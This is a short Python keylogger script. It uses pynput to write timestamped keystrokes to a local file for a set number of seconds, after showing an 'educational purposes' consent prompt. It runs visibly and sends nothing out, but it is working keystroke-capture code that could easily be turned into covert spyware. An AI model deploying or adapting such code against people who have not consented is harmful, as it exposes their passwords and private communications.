import pynput
import time
import sys
import os
#wj 
# Log file path
log_file = "key_log.txt"

# Function to capture and log keystrokes
def log_key(key):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    try:
        # Handle printable characters
        key_data = f"{timestamp}: {key.char}\n"
    except AttributeError:
        # Handle special keys and numpad numbers
        key_data = f"{timestamp}: {getattr(key, 'name', str(key))}\n"

    with open(log_file, "a") as file:
        file.write(key_data)

# Displaying terms and requesting user confirmation
def show_disclaimer():
    print("------------ Ethical Keylogger Notice ------------")
    print("This program is for educational purposes only.")
    print("You must obtain permission before using it.")
    print("\nBy using this software, you agree to the following:")
    print("1. You have permission to log keystrokes on the device.")
    print("2. You will not use it to break any laws.")
    print("3. You are responsible for how you use the data collected.")
    
    consent = input("\nDo you accept these terms? (yes/no): ").lower()
    if consent != 'yes':
        print("You must agree to the terms to use this program.")
        sys.exit()

# Get the duration for how long to log
def get_duration():
    try:
        duration = int(input("Enter logging duration in seconds: "))
        return duration
    except ValueError:
        print("Invalid input! Please enter a valid number.")
        sys.exit()

# Main keylogger function
def start_keylogger():
    show_disclaimer()
    duration = get_duration()

    # Start the keyboard listener
    with pynput.keyboard.Listener(on_press=log_key) as listener:
        print(f"Logging keystrokes for {duration} seconds...")
        time.sleep(duration)
        listener.stop()

    # Display location of the saved log file
    print(f"Keystrokes logged to: {os.path.abspath(log_file)}")

if __name__ == "__main__":
    start_keylogger()